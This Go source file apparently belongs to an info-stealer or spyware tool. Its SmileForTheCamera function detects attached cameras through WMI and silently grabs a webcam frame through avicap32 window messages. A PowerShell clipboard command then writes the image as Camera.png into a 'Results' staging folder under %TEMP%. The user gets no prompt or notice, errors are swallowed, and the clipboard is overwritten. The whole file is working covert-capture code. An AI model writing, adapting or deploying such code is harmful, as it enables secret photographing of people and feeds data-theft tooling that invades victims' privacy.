package camera

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/StackExchange/wmi"
)

func SmileForTheCamera() {
	var dst []win32PnPEntity
	if err := wmi.Query("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')", &dst); err != nil {
		return
	}

	if len(dst) == 0 {
		return
	}

	var webCap = "WebCap"
	handle, _, _ := proc.Call(uintptr(unsafe.Pointer(&webCap)), 0, 0, 0, 320, 240, 0, 0)

	proc2.Call(handle, 1034, 0, 0)
	proc2.Call(handle, 1074, 0, 0)
	proc2.Call(handle, 1084, 0, 0) // ugly !!
	proc2.Call(handle, 1054, 0, 0)
	proc2.Call(handle, 1035, 0, 0)

	camera, err := os.Create(fmt.Sprintf("%s\\Results\\%s", os.Getenv("TEMP"), "Camera.png"))
	if err != nil {
		return
	}

	clip, err := readClip()
	if err != nil {
		return
	}

	_, err = io.Copy(camera, clip)
	if err != nil {
		return
	}

	camera.Close()
}

func readClip() (io.Reader, error) {
	f, err := ioutil.TempFile("", "")
	if err != nil {
		return nil, err
	}
	f.Close()

	_, err = exec.Command("PowerShell", "-Command", "Add-Type", "-AssemblyName", fmt.Sprintf("System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", f.Name())).CombinedOutput()
	if err != nil {
		return nil, err
	}

	r := new(bytes.Buffer)
	file, err := os.Open(f.Name())
	if err != nil {
		return nil, err
	}

	if _, err := io.Copy(r, file); err != nil {
		return nil, err
	}
	file.Close()

	os.Remove(f.Name())

	return r, nil
}

type win32PnPEntity struct {
	Caption           string
	CreationClassName string
	Description       string
	DeviceID          string
	Manufacturer      string
	Name              string
	PNPClass          string
}

var (
	dll   = syscall.NewLazyDLL("avicap32.dll")
	dll2  = syscall.NewLazyDLL("user32.dll")
	proc  = dll.NewProc("capCreateCaptureWindowA")
	proc2 = dll2.NewProc("SendMessageA")
)
